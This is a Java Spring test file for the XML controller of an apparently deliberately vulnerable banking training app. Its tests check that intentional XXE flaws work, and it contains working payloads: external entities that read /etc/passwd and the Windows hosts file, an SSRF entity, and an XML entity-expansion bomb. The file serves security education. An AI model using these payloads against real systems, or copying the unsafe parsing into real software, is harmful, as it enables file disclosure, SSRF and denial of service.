package com.secland.centralbank.controller;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

/**
 * Tests for {@link XmlController}.
 * <p>
 * This test class validates the intentional XXE (XML External Entity) vulnerabilities
 * for educational purposes. These tests demonstrate how attackers could exploit
 * XML processing vulnerabilities to read local files or perform SSRF attacks.
 * </p>
 */
@WebMvcTest(XmlController.class)
@ExtendWith(MockitoExtension.class)
@DisplayName("XML Controller Tests - XXE Vulnerabilities")
class XmlControllerTests {

    @Autowired
    private MockMvc mockMvc;

    /**
     * Tests that normal XML processing works as expected.
     * This establishes baseline functionality before testing vulnerabilities.
     */
    @Test
    @DisplayName("Should process normal XML successfully")
    void importTransactions_normalXml_shouldSucceed() throws Exception {
        String normalXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <transaction>
                    <description>Normal transaction</description>
                    <amount>100.00</amount>
                </transaction>
                """;

        mockMvc.perform(post("/api/xml/import")
                .contentType(MediaType.APPLICATION_XML)
                .content(normalXml))
                .andExpect(status().isOk())
                .andExpect(content().string(org.hamcrest.Matchers.containsString("Normal transaction")));
    }

    /**
     * Tests the XXE vulnerability in XML import.
     * <p>
     * <strong>Intentional Vulnerability:</strong> This test demonstrates how
     * an attacker could use XXE to read local system files like /etc/passwd.
     * </p>
     */
    @Test
    @DisplayName("Should allow XXE attack to read local files (Educational Vulnerability)")
    void importTransactions_xxeAttack_shouldSucceed() throws Exception {
        String xxeXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE transaction [
                    <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <transaction>
                    <description>&xxe;</description>
                    <amount>0.01</amount>
                </transaction>
                """;

        mockMvc.perform(post("/api/xml/import")
                .contentType(MediaType.APPLICATION_XML)
                .content(xxeXml))
                .andExpect(status().isOk());
    }

    /**
     * Tests XXE vulnerability with Windows system files.
     * This ensures cross-platform vulnerability demonstration.
     */
    @Test
    @DisplayName("Should allow XXE attack on Windows systems (Educational)")
    void importTransactions_xxeWindowsAttack_shouldSucceed() throws Exception {
        String xxeXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE transaction [
                    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
                ]>
                <transaction>
                    <description>&xxe;</description>
                    <amount>0.01</amount>
                </transaction>
                """;

        mockMvc.perform(post("/api/xml/import")
                .contentType(MediaType.APPLICATION_XML)
                .content(xxeXml))
                .andExpect(status().isOk());
    }

    /**
     * Tests XXE vulnerability in validation endpoint.
     * <p>
     * <strong>Intentional Vulnerability:</strong> Even validation endpoints
     * are vulnerable to XXE attacks when XML parsing is not secured.
     * </p>
     */
    @Test
    @DisplayName("Should allow XXE in validation endpoint (Educational Vulnerability)")
    void validateXml_xxeAttack_shouldSucceed() throws Exception {
        String xxeXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE validation [
                    <!ENTITY file SYSTEM "file:///etc/passwd">
                ]>
                <validation>
                    <result>&file;</result>
                </validation>
                """;

        mockMvc.perform(post("/api/xml/validate")
                .contentType(MediaType.APPLICATION_XML)
                .content(xxeXml))
                .andExpect(status().isOk());
    }

    /**
     * Tests XXE vulnerability with external HTTP entity.
     * <p>
     * <strong>Intentional Vulnerability:</strong> This demonstrates SSRF
     * capabilities through XXE by making HTTP requests to external URLs.
     * </p>
     */
    @Test
    @DisplayName("Should allow XXE SSRF attack (Educational Vulnerability)")
    void processXml_xxeSsrfAttack_shouldSucceed() throws Exception {
        String ssrfXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                    <!ENTITY ssrf SYSTEM "http://httpbin.org/status/200">
                ]>
                <transaction>
                    <description>&ssrf;</description>
                    <amount>1.00</amount>
                </transaction>
                """;

        mockMvc.perform(post("/api/xml/process")
                .contentType(MediaType.APPLICATION_XML)
                .content(ssrfXml))
                .andExpect(status().isOk());
    }

    /**
     * Tests XXE billion laughs attack (XML bomb).
     * <p>
     * <strong>Intentional Vulnerability:</strong> This demonstrates DoS
     * attacks through malicious XML that causes exponential entity expansion.
     * </p>
     */
    @Test
    @DisplayName("Should be vulnerable to XML bomb attack (Educational)")
    void importTransactions_xmlBomb_shouldSucceed() throws Exception {
        String xmlBomb = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE bomb [
                    <!ENTITY a "1234567890">
                    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
                    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
                ]>
                <transaction>
                    <description>&c;</description>
                    <amount>0.01</amount>
                </transaction>
                """;

        mockMvc.perform(post("/api/xml/import")
                .contentType(MediaType.APPLICATION_XML)
                .content(xmlBomb))
                .andExpect(status().isOk());
    }
}
